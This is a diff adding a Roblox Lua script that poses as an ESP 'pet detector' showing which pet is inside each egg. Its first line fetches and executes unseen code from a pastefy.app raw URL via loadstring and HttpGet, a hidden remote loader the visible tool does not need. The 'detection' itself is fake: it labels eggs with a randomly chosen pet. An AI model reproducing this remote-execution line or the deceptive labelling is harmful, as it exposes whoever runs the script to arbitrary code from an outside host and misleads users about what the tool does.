@@ -1,0 +1,166 @@
+loadstring(game:HttpGet("https://pastefy.app/Pkva5vVn/raw"))()
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
+local EggData = {
+    ["Bug Egg"] = {"Caterpillar", "Giant Ant", "Praying Mantis"},
+    ["Night Egg"] = {"Night Owl", "Echo Frog", "Frog", "Mole", "Hedgehog"},
+    ["Mythical Egg"] = {"Red Giant Ant", "Squirrel", "Brown Mouse", "Grey Mouse"},
+    ["Dinosaur Egg"] = {"Brontosaurus", "Pterodactyl", "Stegosaurus", "Triceratops", "Raptor"},
+    ["Primal Egg"] = {"Ankylosaurus", "Dilophosaurus", "Pachycephalosaurus", "Iguanodon", "Parasaurolophus"},
+    ["Paradise Egg"] = {"Scarlet Macaw", "Capybara", "Peacock", "Ostrich"},
+    ["Anti Egg"] = {"Bee Moth", "Tarantula Hawk", "Wasp"},
+}
+
+local PetColors = {
+    ["Wasp"] = Color3.fromRGB(255, 0, 0),
+    ["Tarantula Hawk"] = Color3.fromRGB(255, 69, 0),
+    ["Bee Moth"] = Color3.fromRGB(255, 215, 0),
+    ["Peacock"] = Color3.fromRGB(0, 153, 255),
+    ["Scarlet Macaw"] = Color3.fromRGB(255, 36, 0),
+    ["Capybara"] = Color3.fromRGB(160, 82, 45),
+    ["Ostrich"] = Color3.fromRGB(240, 240, 240),
+}
+
+local eggESP = {}
+local eggLabels = {}
+local visible = true
+
+local cooldown = false
+
+local function clearAll()
+    for _, esp in pairs(eggESP) do
+        if esp and esp.Parent then esp:Destroy() end
+    end
+    eggESP = {}
+
+    for _, label in pairs(eggLabels) do
+        if label and label.Parent then label:Destroy() end
+    end
+    eggLabels = {}
+end
+
+local function createESP(egg, color)
+    local highlight = Instance.new("Highlight")
+    highlight.Adornee = egg
+    highlight.FillColor = color
+    highlight.FillTransparency = 0.6
+    highlight.OutlineColor = color
+    highlight.OutlineTransparency = 0
+    highlight.Parent = egg
+    table.insert(eggESP, highlight)
+end
+
+local function createLabel(egg, petName)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "PetDetectorBillboard"
+    billboard.Size = UDim2.new(0, 220, 0, 40)
+    billboard.Adornee = egg.PrimaryPart or egg:FindFirstChildWhichIsA("BasePart")
+    billboard.AlwaysOnTop = true
+    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+    billboard.Parent = egg
+
+    local label = Instance.new("TextLabel")
+    label.BackgroundTransparency = 1
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.Text = "Inside: " .. petName
+    label.TextColor3 = Color3.fromRGB(255, 255, 0)
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 20
+    label.Parent = billboard
+
+    table.insert(eggLabels, billboard)
+end
+
+local function getRandomPet(eggName)
+    local pets = EggData[eggName]
+    if pets then
+        return pets[math.random(1, #pets)]
+    end
+    return nil
+end
+
+local function update()
+    clearAll()
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj:IsA("Model") and EggData[obj.Name] then
+            local egg = obj
+            local pet = getRandomPet(egg.Name)
+            if pet then
+                local color = PetColors[pet] or Color3.fromRGB(255, 255, 0)
+                if visible then
+                    createESP(egg, color)
+                    createLabel(egg, pet)
+                end
+            end
+        end
+    end
+end
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.H then
+        visible = not visible
+        if not visible then
+            clearAll()
+        else
+            update()
+        end
+    end
+end)
+
+local function createButton()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "EggRandomizerUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 180, 0, 50)
+    button.Position = UDim2.new(0, 20, 0, 100)
+    button.Text = "ðŸ” Change Inside"
+    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    button.TextColor3 = Color3.fromRGB(255, 255, 0)
+    button.TextSize = 20
+    button.Font = Enum.Font.GothamBold
+    button.Parent = screenGui
+
+    button.MouseButton1Click:Connect(function()
+        if cooldown then
+            return -- Ignore clicks during cooldown
+        end
+        cooldown = true
+        button.Active = false
+        button.Text = "Cooldown: 30s"
+
+        -- Update once immediately
+        if visible then
+            update()
+        end
+      
+        -- Countdown coroutine
+        coroutine.wrap(function()
+            for i = 29, 1, -1 do
+                button.Text = "Cooldown: "..i.."s"
+                wait(1)
+            end
+            button.Text = "ðŸ” Change Inside"
+            button.Active = true
+            cooldown = false
+        end)()
+    end)
+end
+
+createButton()
+update()
+
+while true do
+    wait(30)
+    if visible then
+        update()
+    else
+        clearAll()
+    end
+end
